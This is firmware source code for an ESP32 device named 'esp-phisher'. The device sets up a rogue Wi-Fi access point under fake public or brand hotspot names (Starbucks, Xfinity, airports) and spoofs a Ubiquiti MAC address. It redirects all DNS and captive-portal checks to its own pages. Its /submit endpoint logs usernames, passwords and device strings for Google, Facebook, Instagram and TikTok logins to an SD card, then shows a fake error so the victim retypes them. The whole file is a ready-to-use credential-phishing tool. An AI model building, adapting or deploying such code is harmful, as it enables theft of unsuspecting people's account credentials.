// esp-phisher v1.8.3 – github.com/socalit

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <SD.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>
#include <esp_wifi.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define SD_CS     5
#define BTN_UP    32
#define BTN_DOWN  33
#define BTN_ENTER 25
#define BTN_BACK  26
#define LED_TX    12
#define LED_RX    13
#define LED_PWR   14

#define EEPROM_SIZE   64
#define SSID_OFFSET    4
#define MAX_SSID_LEN  32

String ap_ssid = "Free Public WiFi";
const char* const ssidOptions[] = {
  "Free Public WiFi", "Airport Free WiFi", "Starbucks WiFi",
  "Xfinity WiFi", "Hotel Guest WiFi", "Free Open WiFi", "McDonald's WiFi"
};
int ssidIndex = 0;
unsigned int lastLogSize = 0;

DNSServer dnsServer;
AsyncWebServer server(80);
const byte DNS_PORT = 53;

enum MenuState { HOME, MENU, VIEW_LOG, SET_SSID };
MenuState currentState = HOME;
int selectedMenu = 0;
unsigned long lastInteraction = 0;
const unsigned long TIMEOUT_MS = 15000;

const char* portalHTML =
  "<!DOCTYPE html><html><head><title>Redirect</title>"
  "<meta http-equiv=\"refresh\" content=\"0; url=/\" /></head>"
  "<body>Redirecting...</body></html>";

void saveSSID(const String& s) {
  EEPROM.begin(EEPROM_SIZE);
  int len = min((int)s.length(), MAX_SSID_LEN - 1);
  for (int i = 0; i < len; ++i) EEPROM.write(SSID_OFFSET + i, s[i]);
  EEPROM.write(SSID_OFFSET + len, '\0');
  EEPROM.commit(); EEPROM.end();
}
String loadSSID() {
  EEPROM.begin(EEPROM_SIZE);
  char buf[MAX_SSID_LEN];
  for (int i = 0; i < MAX_SSID_LEN; ++i) {
    buf[i] = EEPROM.read(SSID_OFFSET + i);
    if (buf[i] == '\0') break;
  }
  buf[MAX_SSID_LEN - 1] = '\0';
  EEPROM.end();
  String s(buf);
  if (s.length()) return s;
  saveSSID("Free Public WiFi");
  return "Free Public WiFi";
}
void loadLastLogSize() {
  EEPROM.begin(EEPROM_SIZE);
  lastLogSize = EEPROM.readUInt(0);
  EEPROM.end();
}
void saveLogSize(unsigned int sz) {
  EEPROM.begin(EEPROM_SIZE);
  EEPROM.writeUInt(0, sz);
  EEPROM.commit();
  EEPROM.end();
}
unsigned int getLogSize() {
  if (!SD.exists("/log.txt")) return 0;
  File f = SD.open("/log.txt", FILE_READ); unsigned int sz = f.size(); f.close();
  return sz;
}
void clearLog() {
  if (SD.exists("/log.txt")) SD.remove("/log.txt");
  saveLogSize(0);
  lastLogSize = 0;
}
void drawHomeScreen() {
  display.clearDisplay();
  display.setCursor(0, 0); display.print("SSID: "); display.println(ap_ssid.substring(0, 16));
  display.setCursor(0, 10); int c = WiFi.softAPgetStationNum(); display.printf("Clients: %d", c);
  digitalWrite(LED_RX, c ? HIGH : (millis() % 1000 < 500));
  display.setCursor(0, 20); unsigned int cur = getLogSize();
  display.printf("New Login: %s", cur > lastLogSize ? "YES" : "NO");
  digitalWrite(LED_TX, cur > lastLogSize);
  display.display();
}
void drawMenu() {
  const char* items[] = { "View Logins", "Clear Logs", "Set SSID", "Reboot" };
  display.clearDisplay();
  for (int i = 0; i < 4; i++) {
    display.setCursor(0, i * 10);
    if (i == selectedMenu) display.print("> ");
    display.print(items[i]);
  }
  display.display();
}
void drawSSIDSelector() {
  display.clearDisplay();
  display.setCursor(0, 0); display.println("Select SSID:");
  display.setCursor(0, 10); display.print("> "); display.println(ssidOptions[ssidIndex]);
  display.display();
}
void drawLogView() {
  display.clearDisplay(); display.setCursor(0, 0);
  if (!SD.exists("/log.txt")) display.println("No logins.");
  else {
    File f = SD.open("/log.txt", FILE_READ);
    for (int i = 0; i < 3 && f.available(); i++) {
      String ln = f.readStringUntil('\n');
      display.setCursor(0, i * 10); display.print(ln.substring(0, 20));
    }
    f.close();
    unsigned int cur = getLogSize(); saveLogSize(cur); lastLogSize = cur;
  }
  display.display();
}
void blinkLed(int pin) {
  for (;;) { digitalWrite(pin, HIGH); delay(250); digitalWrite(pin, LOW); delay(250); }
}
bool checkRequiredFiles() {
  const char* files[] = { "/index.html", "/admin.html", "/success.html", "/terms.html",
                          "/img/facebook.png", "/img/google.png", "/img/instagram.png",
                          "/img/poweredByUniFi.svg", "/img/tiktok.png" };
  for (const char* f : files) {
    if (!SD.exists(f)) {
      Serial.printf("Missing: %s\n", f);
      display.clearDisplay(); display.setCursor(0, 0);
      display.println("Missing file:"); display.println(f);
      display.display(); blinkLed(LED_PWR);
    }
  }
  return true;
}
void resetTimer() { lastInteraction = millis(); }

void handleButtons() {
  int total = sizeof(ssidOptions) / sizeof(ssidOptions[0]);
  if (!digitalRead(BTN_UP)) {
    resetTimer();
    if (currentState == MENU) selectedMenu = (selectedMenu + 3) % 4;
    else if (currentState == SET_SSID) ssidIndex = (ssidIndex - 1 + total) % total;
    delay(200);
  }
  if (!digitalRead(BTN_DOWN)) {
    resetTimer();
    if (currentState == MENU) selectedMenu = (selectedMenu + 1) % 4;
    else if (currentState == SET_SSID) ssidIndex = (ssidIndex + 1) % total;
    delay(200);
  }
  if (!digitalRead(BTN_ENTER)) {
    resetTimer();
    if (currentState == HOME) currentState = MENU;
    else if (currentState == MENU) {
      if (selectedMenu == 0) currentState = VIEW_LOG;
      else if (selectedMenu == 1) { clearLog(); currentState = HOME; }
      else if (selectedMenu == 2) currentState = SET_SSID;
      else if (selectedMenu == 3) ESP.restart();
    } else if (currentState == VIEW_LOG) currentState = MENU;
    else if (currentState == SET_SSID) {
      ap_ssid = ssidOptions[ssidIndex]; saveSSID(ap_ssid); WiFi.softAP(ap_ssid); currentState = HOME;
    }
    delay(200);
  }
  if (!digitalRead(BTN_BACK)) { resetTimer(); currentState = HOME; delay(200); }
}

void setRandomUniFiMac() {
  uint8_t mac[6] = { 0x28, 0x70, 0x4E, random(0, 256), random(0, 256), random(0, 256) };
  esp_wifi_set_mac(WIFI_IF_STA, mac);
  esp_wifi_set_mac(WIFI_IF_AP, mac);
  Serial.printf("MAC spoofed: %02X:%02X:%02X:%02X:%02X:%02X\n",
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void setup() {
  Serial.begin(115200);
  EEPROM.begin(EEPROM_SIZE); loadLastLogSize();
  randomSeed(esp_random());

  WiFi.mode(WIFI_AP);
  delay(100);
  setRandomUniFiMac();

  ap_ssid = loadSSID();

  pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_ENTER, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
  pinMode(LED_TX, OUTPUT); pinMode(LED_RX, OUTPUT); pinMode(LED_PWR, OUTPUT); digitalWrite(LED_PWR, LOW);

  Wire.begin(21, 22);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println("OLED fail"); blinkLed(LED_PWR); }
  display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0); display.println("esp-phisher v1.8.2-bgfix-UA"); display.println("github.com/socalit");
  display.display(); delay(3000);

  if (!SD.begin(SD_CS)) { display.clearDisplay(); display.setCursor(0, 0);
    display.println("SD Failed!"); display.display(); blinkLed(LED_PWR); }
  if (!checkRequiredFiles()) blinkLed(LED_PWR);
  digitalWrite(LED_PWR, HIGH);

  WiFi.softAP(ap_ssid);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(78);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/img/bg.jpg", HTTP_GET, [](AsyncWebServerRequest* r) {
    AsyncWebServerResponse* res = r->beginResponse(SD, "/img/bg.jpg", "image/jpeg");
    res->addHeader("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0");
    res->addHeader("Pragma", "no-cache"); res->addHeader("Expires", "0"); r->send(res);
  });

  server.serveStatic("/", SD, "/").setDefaultFile("index.html");
  server.serveStatic("/admin.html", SD, "/admin.html").setCacheControl("no-cache");
  server.serveStatic("/log.txt", SD, "/log.txt").setCacheControl("no-store, no-cache, must-revalidate, max-age=0");

  auto captive = [](AsyncWebServerRequest* r) { r->send(200, "text/html", portalHTML); };
  const char* cp[] = { "/generate_204", "/gen_204", "/redirect", "/hotspot-detect.html", "/fwlink", "/ncsi.txt", "/connecttest.txt" };
  for (const char* p : cp) server.on(p, HTTP_GET, captive);

  server.on("/mark-read", HTTP_POST, [](AsyncWebServerRequest* r) {
    unsigned int cur = getLogSize(); saveLogSize(cur); lastLogSize = cur;
    r->send(200, "text/plain", "Marked as read");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest* r) {
    if (!r->hasParam("platform", true) || !r->hasParam("username", true) || !r->hasParam("password", true)) {
      r->send(400, "text/plain", "Missing parameters"); return;
    }
    String plat = r->getParam("platform", true)->value();
    String usr = r->getParam("username", true)->value();
    String pwd = r->getParam("password", true)->value();
    if (plat == "Google" && usr.indexOf('@') == -1) {
      r->redirect("/index.html?error=email"); return;
    }
    String agent = r->header("User-Agent");
    if (agent.isEmpty()) agent = "unknown";
    String entry = "[" + plat + "] User: " + usr + " | Pass: " + pwd + " | Device: " + agent + "\n";
    File f = SD.open("/log.txt", FILE_APPEND);
    if (f) { f.print(entry); f.close(); digitalWrite(LED_TX, HIGH); delay(300); digitalWrite(LED_TX, LOW); }
    r->redirect("/index.html?error=1");
  });

  server.on("/clear", HTTP_POST, [](AsyncWebServerRequest* r) {
    if (r->hasParam("key", true) && r->getParam("key", true)->value() == "3000") {
      clearLog(); r->send(200, "text/plain", "Log cleared");
    } else r->send(403, "text/plain", "Unauthorized");
  });

  server.on("/bg", HTTP_POST, [](AsyncWebServerRequest* r) {
    if (!r->hasParam("bg", true)) { r->send(400, "text/plain", "Missing parameters"); return; }
    String path = r->getParam("bg", true)->value(); path.trim();
    if (!path.length() || !SD.exists(path)) { r->send(404, "text/plain", "Background not found"); return; }
    if (SD.exists("/img/bg.jpg")) SD.remove("/img/bg.jpg");
    File src = SD.open(path, FILE_READ); if (!src) { r->send(500, "text/plain", "Open src fail"); return; }
    File dst = SD.open("/img/bg.jpg", FILE_WRITE); if (!dst) { src.close(); r->send(500, "text/plain", "Open dst fail"); return; }
    uint8_t buf[512]; size_t n; while ((n = src.read(buf, 512)) > 0) dst.write(buf, n);
    src.close(); dst.close();
    r->send(200, "text/plain", "Background updated");
  });

  server.on("/bg", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "text/plain", "bg.jpg");
  });

  server.on("/ssid", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "text/plain", loadSSID());
  });
  server.on("/ssid", HTTP_POST, [](AsyncWebServerRequest* r) {
    if (!r->hasParam("ssid", true)) { r->send(400, "text/plain", "Missing parameters"); return; }
    String s = r->getParam("ssid", true)->value(); s.trim();
    if (s.length() == 0 || s.length() > 31) { r->send(400, "text/plain", "Invalid SSID"); return; }
    ap_ssid = s; saveSSID(ap_ssid); WiFi.softAP(ap_ssid); r->send(200, "text/plain", "SSID updated");
  });

  server.begin();
}

void loop() {
  handleButtons();
  switch (currentState) {
    case HOME: drawHomeScreen(); break;
    case MENU: drawMenu(); break;
    case VIEW_LOG: drawLogView(); break;
    case SET_SSID: drawSSIDSelector(); break;
  }
  if (millis() - lastInteraction > TIMEOUT_MS && currentState != HOME) currentState = HOME;
  delay(100);
}
